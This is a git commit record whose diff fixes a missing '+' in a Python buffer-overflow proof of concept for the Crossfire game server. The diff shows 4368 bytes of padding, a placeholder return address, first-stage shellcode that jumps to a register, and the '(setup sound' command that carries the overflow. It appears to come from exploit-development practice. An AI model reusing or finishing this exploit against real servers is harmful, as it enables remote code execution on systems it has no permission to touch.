65e0a40b0a1f7081d0725b1c718c4cbe6ca4b93e
kali <jarrettw@protonmail.com>
2020-03-17 12:51:30 -0400

    added + due to syntax error

--- crossfire-poc.py
+++ crossfire-poc.py
@@ -7,7 +7,7 @@ padding = "\x41" * 4368
 eip = "\x42" * 4
 first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
 
-buffer = "\x11(setup sound " + padding + eip + first_stage "\x90\x00#"
+buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
